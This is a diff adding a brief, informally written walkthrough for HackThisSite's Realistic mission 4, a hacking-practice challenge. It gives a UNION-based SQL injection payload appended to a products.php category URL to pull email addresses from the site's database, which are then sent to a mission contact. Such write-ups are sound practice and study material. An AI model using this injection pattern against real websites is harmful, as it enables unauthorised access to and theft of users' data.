@@ -1,0 +1,8 @@
+go to the website as stated in the message
+the you will find two links ("https://www.hackthissite.org/missions/realistic/4/products.php?category=1" and "https://www.hackthissite.org/missions/realistic/4/products.php?category=2"). Click on any one
+the reditected page is vulnerable to sqli_injection (UNION ALL SELECT null, *, null, null FROM email;)
+Thus the link would be:
+		https://www.hackthissite.org/missions/realistic/4/products.php?category=2UNION ALL SELECT null, *, null, null FROM email;
+Get the email ids from there.
+and send it to "SaveTheWhales"
+using "HTS message centre"
